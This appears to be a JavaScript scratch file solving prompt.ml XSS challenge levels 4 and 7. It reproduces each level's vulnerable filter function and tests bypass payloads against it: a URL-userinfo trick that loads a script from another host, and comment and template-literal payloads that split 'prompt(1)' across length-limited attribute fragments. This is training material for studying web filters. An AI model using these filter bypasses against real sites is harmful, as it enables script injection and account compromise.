/*
// 4 

function escape(input) {
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        console.log("yes");        
    } else {
        return 'Invalid resource.';
    }
}

console.log(escape("http://prompt.ml%2f@000/test.js"));
console.log(escape("http://prompt.ml@000/test.js"));
console.log(escape("http://prompt.ml/@000/test.js"));
// The third one will pass if condition, but will make domain into path, which is not correct.
*/


// 7
// #;prompt(1)#
// /*#*/;prompt(1)/*#*/
// '#';prompt(1)

function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}

//console.log(escape("prompt(1)"))
console.log(escape("><script>`#`;prompt(1)`#'</script>"))
//console.log(escape("prompt(1)"))
